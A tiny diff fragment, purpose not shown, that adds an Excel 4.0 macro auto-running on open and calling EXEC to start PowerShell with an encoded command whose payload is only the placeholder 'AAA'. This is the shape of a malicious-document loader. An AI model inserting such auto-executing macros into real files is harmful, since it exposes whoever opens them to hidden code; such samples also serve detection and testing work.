@@ -1,0 +1,2 @@
+XLM: Auto_Open
+=EXEC("powershell -enc AAA")
